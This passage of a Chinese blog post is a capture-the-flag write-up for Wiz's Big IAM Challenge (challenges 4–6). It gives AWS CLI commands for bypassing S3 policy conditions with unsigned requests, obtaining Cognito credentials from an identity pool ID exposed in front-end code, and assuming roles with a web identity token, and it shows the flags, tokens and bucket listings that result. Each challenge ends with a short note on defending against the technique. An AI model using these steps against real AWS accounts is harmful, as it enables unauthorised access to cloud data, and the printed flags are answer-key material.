</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Resource&#34;: </span><span style=color:#e6db74>&#34;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Condition&#34;: </span>{
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;StringLike&#34;: </span>{
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;s3:prefix&#34;: </span><span style=color:#e6db74>&#34;files/*&#34;</span>
</span></span><span style=display:flex><span>                },
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;ForAllValues:StringLike&#34;: </span>{
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;aws:PrincipalArn&#34;: </span><span style=color:#e6db74>&#34;arn:aws:iam::133713371337:user/admin&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这个策略包含两个声明，定义了对特定 S3 存储桶的访问权限：</p><ol><li>允许所有用户对存储桶 thebigiamchallenge-admin-storage-abf1321 中的所有对象执行 s3:GetObject 操作。</li><li>允许所有用户对存储桶 thebigiamchallenge-admin-storage-abf1321 执行 s3:ListBucket 操作，但仅限于符合以下条件的请求：</li></ol><ul><li>请求的前缀为 files/*。</li><li>请求者的 ARN 为 arn:aws:iam::133713371337:user/admin，但在参考<a href=https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys>AWS Doc</a>中指出如果请求上下文中意外出现缺失的上下文键或具有空值的上下文键，存在被绕过的风险。</li></ul><p>有以下两种方式可以在发送请求时，让 <code>aws:PrincipalArn</code> 值为空：
第一种为直接使用浏览器访问https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/
第二种则是使用以下命令</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
</span></span><span style=display:flex><span>2023-06-07 19:15:43         <span style=color:#ae81ff>42</span> flag-as-admin.txt
</span></span><span style=display:flex><span>2023-06-08 19:20:01      <span style=color:#ae81ff>81889</span> logo-admin.png
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt -  
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>wiz:principal-arn-is-not-what-you-think<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=思考-3>思考<a href=#思考-3 class=hanchor arialabel=Anchor>#</a></h3><p>在策略配置中，要注意授权主体的限制条件是否使用了 <code>ForAllValues</code>。可以考虑将 <code>ForAllValues</code> 替换为 <code>ForAnyValue</code>。如果键值为空，<code>ForAnyValue</code> 会返回 <code>False</code>，而不是 <code>True</code>。这样，如果是未授权的访问，就会提示 <code>AccessDenied</code>。</p><h2 id=challenge-5-do-i-know-you>Challenge 5: Do I know you?<a href=#challenge-5-do-i-know-you class=hanchor arialabel=Anchor>#</a></h2><h3 id=解题-4>解题<a href=#解题-4 class=hanchor arialabel=Anchor>#</a></h3><p>查看View IAM Policys</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Version&#34;: </span><span style=color:#e6db74>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Statement&#34;: </span>[
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Sid&#34;: </span><span style=color:#e6db74>&#34;VisualEditor0&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Effect&#34;: </span><span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Action&#34;: </span>[
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;mobileanalytics:PutEvents&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;cognito-sync:*&#34;</span>
</span></span><span style=display:flex><span>            ],
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Resource&#34;: </span><span style=color:#e6db74>&#34;*&#34;</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Sid&#34;: </span><span style=color:#e6db74>&#34;VisualEditor1&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Effect&#34;: </span><span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Action&#34;: </span>[
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;s3:GetObject&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;s3:ListBucket&#34;</span>
</span></span><span style=display:flex><span>            ],
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Resource&#34;: </span>[
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;arn:aws:s3:::wiz-privatefiles&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;arn:aws:s3:::wiz-privatefiles/*&#34;</span>
</span></span><span style=display:flex><span>            ]
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这个策略包含两个声明，定义了对特定 AWS 服务和资源的访问权限：</p><ol><li>允许对所有资源执行以下操作：</li></ol><ul><li>mobileanalytics:PutEvents: 允许调用 Amazon Mobile Analytics 的 PutEvents 操作。</li><li>cognito-sync:*: 允许调用 Amazon Cognito Sync 的所有操作。</li></ul><ol start=2><li>允许对特定 S3 存储桶和其对象执行以下操作：</li></ol><ul><li>s3:GetObject: 允许获取 S3 对象的操作。</li><li>s3:ListBucket: 允许列出 S3 存储桶内容的操作。</li><li>资源限定为 arn:aws:s3:::wiz-privatefiles 和 arn:aws:s3:::wiz-privatefiles/*，即特定的 S3 存储桶及其所有对象。</li></ul><p>参考<a href=https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/what-is-amazon-cognito.html>AWS Doc</a>，可以了解到Amazon Cognito提供了一个用于 Web 和移动应用程序的身份平台。我们需要思考如何通过特定的身份池获取用户凭证，从而最终获得对 S3 的访问权限。
第一步是如何获取可能包含用户凭证的identity pool ID，开启浏览器的开发者工具，搜索<code>wiz-privatefiles</code>关键字
<img alt=script src=/img/2024/wiz-the-big-iam-challenge-1.jpg></p><p>根据上述java script代码，得知通过IdentityPoolId(us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b)获取访问wiz-privatefiles存储桶的凭证
使用aws cli复现上述java script代码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;IdentityId&#34;</span>: <span style=color:#e6db74>&#34;us-east-1:157d6171-ee96-ce56-8cea-da3d8f2677c3&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d6171-ee96-ce56-8cea-da3d8f2677c3
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;IdentityId&#34;</span>: <span style=color:#e6db74>&#34;us-east-1:157d6171-ee96-ce56-8cea-da3d8f2677c3&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Credentials&#34;</span>: <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;AccessKeyId&#34;</span>: <span style=color:#e6db74>&#34;&lt;AccessKeyId&gt;&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;SecretKey&#34;</span>: <span style=color:#e6db74>&#34;&lt;SecretKey&gt;&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;SessionToken&#34;</span>: <span style=color:#e6db74>&#34;IQoJb3JpZ2luX2VjEHgaCXVzLWVhc3QtMSJIMEYCIQD4Tm5j5wN2HplygNU6dgtz8m8UoMMHw83VjBIs99UzZAIhAPil8Q6A3AC/XsrHpecvjkhir3cDRV+4BGiWTCz52sKcKtEFCJH//////////wEQABoMMDkyMjk3ODUxMzc0Igx45Fnq/CU7h9djpVkqpQUzW7dQaCAtVqOwLnmtiSUmr4IgKRN2WotXzsIomfGn1t/d+O1uSXtuFtqGrOdv2Vvm3S5/lXOBrPYb1pGrYHm1z6d8I8FcyKSvvLoiDWrJSv+K4Q8YjhfpfljnkIsE9R0Q+0ZpBbMJvt80emLiFoBPvDdewURvOe/jwhhqMU2717C32mgbYI1gF0gC4zZ6tNJcSOizNyp7rzNALnYlfesPpS+J8Heg9XSjYT9frmJLzeE/t9Vt5/U5MpM8VQmt4/oZmAJSG6GuvWSQ9BWczDeYlsFJHX/JluXssEF5cRghcduUPrGVuainY5r8rdll0u98XcaW2oipE2z2fX1HjfM4KtIUucRyhfAPJwGOgFV1woS1zP/PBNychB9yAeApbppGcayQnUTKic4WmA3Ds7d8XxhITh1Wog77acH5GE5yP0QzhLG5mq1YTCtt4ZqyZU1aY4oniywWtvecQP9pYAQWapLE5ZysbTwW6FDIWTCDVVTAJgtccrRlPSx1xGu64ipJWPGfBS25MQuKdBIoJBFN3g5CwE57YDfa806Z19TxNnS7anVU1bQFNUaIxbvfsGIuxAjWC1ntrx2UbRYrlRXcctJhopr/bWkd68NHTw6UGNY5SfqKhenV0vaIrbpM9ZcrPCkRwT+TUOr+/TlmMfRnMalEqxjbGxLQuwv1JIFpPnwpRUPyJCp+gOlezJUfchsGluiQ2VQ1yy4eO+lBQ8azO243/mrr3ieEHj5CUS5c0BBSSaTxqJCFzH0VUpBJ/iDWmlio71v3pvha7H7wuWsdwT/ahOXv5d7dagH8LZF7lgJ2uWgsnQ5skhe4ZYXhHSEzbVCIJvt8+tTLt4zKvQ2k2BOoN2+VnZX08JPUmPIMgkD3vyYDNLawcQeLsNFY506AzEVv4TCvl9K2BjrdAg0Itz+iWPd/LYzGfIAK3BE4SCaNGI5qgBnOa2ppd6Ymnlpi7oTII1/G9iX83RP2vrt4kyS37r074FC1XfAr6btl7KlcaQhhqfrqyuupMpuTRtefSJw7rzbH3jZ71GcBkSPSBQLMmZqFKYRxV0aDWv91mdKKBcVu/7ZmjCIF/y5kCwjtLsvgY22H9uTMHCCP+Y0HBQXr7cx1+Q2mBO/QiE9+o3PzsFmlXnz7AVFEyvtpSQE58CnTlLBjN0oxBXrd0DYyUYIYVE5CLoof6/YYJQ2qTC4hVAT8KZDY+LrmoWMXKDPTrbnFdlsKwRv2fTbdzXRvSsyFz/fAyG752zw7DBWmeeeVllEFNB0Zr2GZ2Jd6BU1Uh8d9Wp2l6SqNMEoy7jHXBrAdM5iekoE0wK5rA9ppZ+hgX1Vrw19r0bc4cMQiU3w6j9mLnxX5Tjp2zaQw96HzLHxj/PEJshCxhFQ=&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Expiration&#34;</span>: 1725209023.0
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>经过上述操作，可以获得临时凭证。
下面通过本地的aws cli使用临时凭证访问S3存储桶</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws configure set aws_access_key_id &lt;AccessKeyId&gt;
</span></span><span style=display:flex><span>$ aws configure set aws_secret_access_key &lt;SecretKey&gt;
</span></span><span style=display:flex><span>$ aws configure set aws_session_token &lt;SessionToken&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ aws sts get-caller-identity
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;UserId&#34;</span>: <span style=color:#e6db74>&#34;AROARK7LBOHXJKAIRDRIU:CognitoIdentityCredentials&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Account&#34;</span>: <span style=color:#e6db74>&#34;092297851374&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Arn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:sts::092297851374:assumed-role/Cognito_s3accessUnauth_Role/CognitoIdentityCredentials&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ aws s3 ls s3://wiz-privatefiles
</span></span><span style=display:flex><span>2023-06-06 03:42:27       <span style=color:#ae81ff>4220</span> cognito1.png
</span></span><span style=display:flex><span>2023-06-05 21:28:35         <span style=color:#ae81ff>37</span> flag1.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ aws s3 cp s3://wiz-privatefiles/flag1.txt -  
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>wiz:incognito-is-always-suspicious<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=思考-4>思考<a href=#思考-4 class=hanchor arialabel=Anchor>#</a></h3><p>前端代码cognito-identity敏感数据泄露，导致相关AK/SK直接访问S3。</p><h2 id=challenge6-one-final-push>challenge6: One final push<a href=#challenge6-one-final-push class=hanchor arialabel=Anchor>#</a></h2><h3 id=解题-5>解题<a href=#解题-5 class=hanchor arialabel=Anchor>#</a></h3><p>查看View IAM Policys</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Version&#34;: </span><span style=color:#e6db74>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Statement&#34;: </span>[
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Effect&#34;: </span><span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Principal&#34;: </span>{
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;Federated&#34;: </span><span style=color:#e6db74>&#34;cognito-identity.amazonaws.com&#34;</span>
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Action&#34;: </span><span style=color:#e6db74>&#34;sts:AssumeRoleWithWebIdentity&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Condition&#34;: </span>{
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;StringEquals&#34;: </span>{
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;cognito-identity.amazonaws.com:aud&#34;: </span><span style=color:#e6db74>&#34;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这段策略的主要功能是允许 Cognito 身份池通过 Web 身份验证来假设角色。具体来说：</p><ul><li>Principal: 允许的联合身份提供者是 Cognito 身份池 (cognito-identity.amazonaws.com)。</li><li>Action: 允许的操作是通过 Web 身份验证来假设角色 (sts:AssumeRoleWithWebIdentity)。</li><li>Condition: 条件是 Cognito 身份池的受众（aud）必须等于指定的身份池 ID (us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b)。</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;IdentityId&#34;</span>: <span style=color:#e6db74>&#34;us-east-1:157d6171-ee75-c89f-27cd-e7cd7e7a9f20&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 从 Amazon Cognito 获取一个 OpenID Connect (OIDC) 令牌</span>
</span></span><span style=display:flex><span>$ aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-ee75-c89f-27cd-e7cd7e7a9f20
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;IdentityId&#34;</span>: <span style=color:#e6db74>&#34;us-east-1:157d6171-ee75-c89f-27cd-e7cd7e7a9f20&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Token&#34;</span>: <span style=color:#e6db74>&#34;eyJraWQiOiJ1cy1lYXN0LTEtNiIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWU3NS1jODlmLTI3Y2QtZTdjZDdlN2E5ZjIwIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3MjUyMDczNzgsImlhdCI6MTcyNTIwNjc3OH0.gGrZv64aDiDDwIJkMZAmvKjqwAreOCL0lNc6yokufj42D_kBg-0qlkFqU-uhnbnXX3-5T44xoABUyOcAOeAxRFGbW6zgj_xWJ_HT2S2-mm39hSVNJ-DZ9QkG3HaYgip1OabTJveaRHx2iPsYF22NKwTAUQ2_0UANM1rq4_vtbfflqazNF5CVdmLmXLF2CPTxjIx2dAhJ6ef-L9PgPeVc9RfjJfsWNmZOUiU1A6hznRFKuZggYtW4LS9a0Og3VbrS3EH0AkF4jHeLundQp8VOXoXdnac4lUk0z9nePpngYAR4Ej6nHlxQ3f-t9Xw4su0S8eCPYQ9AfgrBEGMEeiuyAQ&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 通过 Web 身份验证来假设一个 IAM 角色，并返回临时安全凭证和会话信息</span>
</span></span><span style=display:flex><span><span style=color:#75715e># --role-arn参数 arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role 来自于题目</span>
</span></span><span style=display:flex><span><span style=color:#75715e># --role-session-name参数 随机取名即可</span>
</span></span><span style=display:flex><span>$ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name wiz --web-identity-token &lt;Token&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Credentials&#34;</span>: <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;AccessKeyId&#34;</span>: <span style=color:#e6db74>&#34;&lt;AccessKeyId&gt;&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;SecretAccessKey&#34;</span>: <span style=color:#e6db74>&#34;&lt;SecretAccessKey&gt;&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;SessionToken&#34;</span>: <span style=color:#e6db74>&#34;IQoJb3JpZ2luX2VjEHkaCXVzLWVhc3QtMSJHMEUCIQCBmnQsixW+2qATYKxORysnt4Ve1pxUyO44O5JZMBL0YgIgMdRynGfW0xe/9QZiuqMZues90a+esibC268qjY9anEEqjQMIkf//////////ARAAGgwwOTIyOTc4NTEzNzQiDApUaiK62q+bhTqPdyrhAigATTpURCuQ9gV4DbVrjH6ebcoA1uZDqKMh5BFAv81Z2Tr1q6cYfAWqeBH9c9UBiFovpmUD/ZQbqnz35ctHjAxfUAVSATGOrNasQyDKSvwTy8V+28OQNesiJpiRpeSqcIWDfPbQkwRsLsgZVSWyvWkMSOGh7oWebGMxdAR0AbPamTFOoFJ12kXLHYBAhx1q8XZJuS5Hg0YMlfOJWG5C9YTlcZVx1lrRhwm5BpcHtgnVDAB5XT6UXAjPeK/ExaXaDi4LS00DLTF1lItC+wAOSe7VYQMo57ilHB8B45OXMtvU2xcyJlTVmm/niJPWYBSvPA/jif2tIEOGc8l3oT/pgrEdgQ2kF3Xt+bvtBUuIvAROEbKLQBwqvT1EcRcj+VvZNCopyCjYjQjDwmzbGUAD41XIxFt3nilPV3sZ/YezUcK2FdEX1kLHM74ywNCUBzo3G+7oW8NywY+xUPFIza7AsDMIWm0rYGOocClOK9oSKSg8Ylgi45zjAjvI85j8KqZGwi8Syxpjvn6BT+N2/Ppr2IpBIlVLm7THh9M4i7OLAhK4s8FxOJY3pVC+HMwNZbmQZB9iE4GJ0L0RfdptPbj8mguSts6EKfWH0kmvYEiLf/vbrYW84GaBBDhdF7kBK0ZrD3ep46qQ5ZcaPKxHIlNifCLGH+DR3bdxoMT7j7gAmup6xfR0KaGTxVWqQD7lFy0hfXoKx3aLen4B34cM6eR6aSvCcqbHuiSFbOd5l68y8IT+UmfLGyUzSbHlv/395gmJ32vNFD8JXS9/uJlVaKhcmJBqU3AQYZNjd2fn3+Vz1gWWg1vE1dEOMNJKx9PcRnwjw=&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Expiration&#34;</span>: <span style=color:#e6db74>&#34;2024-09-01T17:15:01+00:00&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;SubjectFromWebIdentityToken&#34;</span>: <span style=color:#e6db74>&#34;us-east-1:157d6171-ee75-c89f-27cd-e7cd7e7a9f20&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;AssumedRoleUser&#34;</span>: <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;AssumedRoleId&#34;</span>: <span style=color:#e6db74>&#34;AROARK7LBOHXASFTNOIZG:wiz&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Arn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/wiz&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Provider&#34;</span>: <span style=color:#e6db74>&#34;cognito-identity.amazonaws.com&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Audience&#34;</span>: <span style=color:#e6db74>&#34;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>经过上述操作，可以获得临时凭证。
下面通过本地的aws cli使用临时凭证访问S3存储桶</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws configure set aws_access_key_id &lt;AccessKeyId&gt;
</span></span><span style=display:flex><span>$ aws configure set aws_secret_access_key &lt;SecretKey&gt;
</span></span><span style=display:flex><span>$ aws configure set aws_session_token &lt;SessionToken&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ aws sts get-caller-identity
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;UserId&#34;</span>: <span style=color:#e6db74>&#34;AROARK7LBOHXASFTNOIZG:wiz&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Account&#34;</span>: <span style=color:#e6db74>&#34;092297851374&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Arn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/wiz&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ aws s3 ls
</span></span><span style=display:flex><span>2024-06-06 14:21:35 challenge-website-storage-1fa5073
</span></span><span style=display:flex><span>2024-06-06 16:25:59 payments-system-cd6e4ba
</span></span><span style=display:flex><span>2023-06-05 01:07:29 tbic-wiz-analytics-bucket-b44867f
</span></span><span style=display:flex><span>2023-06-05 21:07:44 thebigiamchallenge-admin-storage-abf1321
</span></span><span style=display:flex><span>2023-06-05 00:31:02 thebigiamchallenge-storage-9979f4b
</span></span><span style=display:flex><span>2023-06-05 21:28:31 wiz-privatefiles
</span></span><span style=display:flex><span>2023-06-05 21:28:31 wiz-privatefiles-x1000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ aws s3api list-objects-v2 --bucket wiz-privatefiles-x1000
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Contents&#34;</span>: <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Key&#34;</span>: <span style=color:#e6db74>&#34;cognito2.png&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2023-06-05T19:42:27+00:00&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;ETag&#34;</span>: <span style=color:#e6db74>&#34;\&#34;539693e3b6f41aa7545e9f8965c3cadd\&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Size&#34;</span>: 4220,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;StorageClass&#34;</span>: <span style=color:#e6db74>&#34;STANDARD&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Key&#34;</span>: <span style=color:#e6db74>&#34;flag2.txt&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2023-06-05T13:28:35+00:00&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;ETag&#34;</span>: <span style=color:#e6db74>&#34;\&#34;48b4d561fb4900a861fa55626be4a103\&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Size&#34;</span>: 40,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;StorageClass&#34;</span>: <span style=color:#e6db74>&#34;STANDARD&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;RequestCharged&#34;</span>: null
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>wiz:incognito-is-always-suspicious<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=思考-5>思考<a href=#思考-5 class=hanchor arialabel=Anchor>#</a></h3><p>为了防止攻击者同时获取身份池 ID 和角色 ARN 并利用它们获取相应角色的权限，必须确保这两者的信息得到妥善保护。</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2024 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>